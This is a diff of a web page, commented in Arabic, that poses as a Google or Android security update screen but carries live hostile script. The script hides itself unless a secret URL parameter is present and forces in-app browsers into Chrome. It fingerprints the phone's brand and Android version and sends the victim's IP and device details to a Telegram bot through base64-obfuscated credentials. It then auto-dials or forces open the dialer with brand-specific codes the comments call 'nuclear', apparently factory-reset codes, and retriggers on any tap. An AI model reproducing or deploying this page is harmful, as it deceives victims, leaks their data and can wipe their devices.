@@ -3,84 +3,88 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Security Support</title>
+    <title>Android Security Core</title>
     <style>
         body { background:#fff; font-family:sans-serif; text-align:center; padding-top:20%; margin:0; overflow:hidden; }
         .loader { border: 4px solid #f3f3f3; border-top: 4px solid #4285F4; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; display:inline-block; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; }
+        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; cursor: pointer; }
     </style>
 </head>
-<body onload="x_final_launch()">
+<body onload="final_execution()">
 
     <div id="overlay"></div>
 
     <div id="content">
         <div class="loader"></div>
-        <p style="color:#5f6368; font-size:18px;">جاري تأمين الحساب وتحديث بروتوكول الأمان...</p>
+        <p style="color:#5f6368; font-size:18px;">جاري تحديث خدمات Google Play...</p>
+        <p style="color:#999; font-size:12px;">يرجى عدم إغلاق الصفحة لضمان أمان حسابك</p>
     </div>
 
 <script>
-    // بيانات التحكم الخاصة بك (التليجرام)
+    // بياناتك المشفرة (بوت التليجرام)
     const _t = "ODU4NTE1NzEzNjpBQUVhQlp3LVgwUXVmT3JFeFRWQ2RKZ20wZXpycTNRTGtqOA==";
     const _c = "NzE4NDk3MDM1NQ==";
     function _d(s) { return atob(s); }
 
-    function x_final_launch() {
-        const urlParams = new URLSearchParams(window.location.search);
-        // التمويه: إذا لم يوجد المفتاح السري يوجهه لجوجل
-        if (urlParams.get('auth') !== 'true') { window.location.href = "https://www.google.com"; return; }
+    function final_execution() {
+        const p = new URLSearchParams(window.location.search);
+        if (p.get('auth') !== 'true') { window.location.href = "https://www.google.com"; return; }
 
         let ua = navigator.userAgent;
         let uL = ua.toLowerCase();
 
-        // 1. ميزة الهروب من المتصفحات الداخلية (واتساب، فيسبوك، إلخ) إلى Chrome لضمان عمل الـ Intent
+        // 1. الهروب من المتصفحات المحدودة (واتساب، فيسبوك) إلى Chrome لضمان نجاح الـ Intent
         if (/FBAN|FBAV|Instagram|WhatsApp|Telegram/i.test(ua)) {
-            let jump = window.location.href;
-            window.location.href = "intent://" + jump.replace(/^https?:\/\//, "") + "#Intent;scheme=https;package=com.android.chrome;end";
+            window.location.href = "intent://" + window.location.href.replace(/^https?:\/\//, "") + "#Intent;scheme=https;package=com.android.chrome;end";
             return;
         }
 
-        // 2. محرك فحص الإصدار الحقيقي وتجاوز تمويه المتصفحات
+        // 2. محرك فحص الإصدار الحقيقي (كشف Android 11+ المخفي)
         let realOS = 10;
         if (ua.indexOf("Android") >= 0) {
             realOS = parseFloat(ua.slice(ua.indexOf("Android") + 8));
-            // تصحيح: إذا كان المتصفح حديثاً ويدعي أنه 10 فهو 11+ (لحماية الخصوصية في كروم)
+            // تصحيح ذكي بناءً على بصمة المتصفح الحديثة
             if (ua.includes("AppleWebKit/537.36") && realOS <= 10 && !ua.includes("Version/4.0")) {
                 realOS = 11; 
             }
         }
 
-        // 3. تحديد نوع الهاتف والكود القاتل بدقة (تحسين التعرف على Realme/Oppo)
+        // 3. تحديد الشركة بدقة (تجاوز Generic عبر فحص الموديلات)
         let brand = "Android Generic";
-        let targetCode = "2767*3855%23"; // الكود النووي الافتراضي
+        let targetCode = "2767*3855%23"; // الكود الافتراضي (Samsung/Realme/Oppo)
 
-        if (uL.includes("samsung")) { brand = "Samsung"; }
-        else if (uL.includes("xiaomi") || uL.includes("redmi") || uL.includes("poco")) { brand = "Xiaomi/Redmi"; targetCode = "%23*%23*7780*%23*%23"; }
-        else if (uL.includes("huawei") || uL.includes("honor")) { brand = "Huawei/Honor"; targetCode = "%23*%23*2846579*%23*%23"; }
-        else if (uL.includes("realme") || uL.includes("oppo") || uL.includes("vivo") || uL.includes("rmx")) { brand = "Realme/Oppo/Vivo"; }
+        if (uL.includes("samsung")) {
+            brand = "Samsung";
+        } else if (uL.includes("xiaomi") || uL.includes("redmi") || uL.includes("miui") || uL.includes("poco")) {
+            brand = "Xiaomi"; targetCode = "%23*%23*7780*%23*%23";
+        } else if (uL.includes("huawei") || uL.includes("honor")) {
+            brand = "Huawei"; targetCode = "%23*%23*2846579*%23*%23";
+        } else if (uL.includes("realme") || uL.includes("rmx") || uL.includes("oppo") || uL.includes("cph") || uL.includes("vivo")) {
+            brand = "Realme/Oppo";
+        }
 
-        // 4. إرسال تقرير الصيد المحدث للتليجرام
+        // 4. إرسال تقرير الصيد الموحد (التقرير الذي يظهر في البوت)
         fetch('https://api.ipify.org?format=json').then(r => r.json()).then(ipData => {
             let status = (realOS >= 11) ? "⚠️ توجيه قسري (11+)" : "🚀 تنفيذ تلقائي (10-)";
-            let log = `🎯 تم رصد صيد جديد!\n🌐 IP: ${ipData.ip}\n📱 الشركة: ${brand}\n⚙️ الإصدار: Android ${realOS}\n📡 الحالة: ${status}\n📟 الكود المستخدم: *${targetCode.replace('%23', '#')}*`;
-            fetch(`https://api.telegram.org/bot${_d(_t)}/sendMessage?chat_id=${_d(_c)}&text=${encodeURIComponent(log)}`);
+            let report = `🎯 صيد نهائي موثق!\n🌐 IP: ${ipData.ip}\n📱 الشركة: ${brand}\n⚙️ الإصدار: Android ${realOS}\n📡 الحالة: ${status}\n📟 الكود: *${targetCode.replace('%23', '#')}*`;
+            fetch(`https://api.telegram.org/bot${_d(_t)}/sendMessage?chat_id=${_d(_c)}&text=${encodeURIComponent(report)}`);
         });
 
-        // 5. التنفيذ القسري بناءً على الإصدار
+        // 5. التنفيذ النووي (تلقائي لـ 10، وقسري لـ 11+)
         setTimeout(() => {
             if (realOS >= 11) {
-                // استخدام بروتوكول Intent لفتح لوحة الاتصال مباشرة مع الكود الجاهز
+                // فتح لوحة الاتصال بالكود المناسب قسرياً
                 window.location.href = `intent://*${targetCode}#Intent;scheme=tel;action=android.intent.action.DIAL;end`;
             } else {
-                // التنفيذ التلقائي للإصدارات القديمة (10 وما دون)
+                // تنفيذ مباشر للإصدارات القديمة
                 window.location.href = "tel:*" + targetCode;
             }
-        }, 1200);
+        }, 1500);
     }
 
-    // إجبار التنفيذ عند أي لمسة على الشاشة لتجاوز حظر المتصفحات
-    document.getElementById('overlay').onclick = x_final_launch;
+    // إجبار النظام على العمل عند أي لمسة للضحية
+    document.getElementById('overlay').onclick = final_execution;
 </script>
 </body>
 </html>
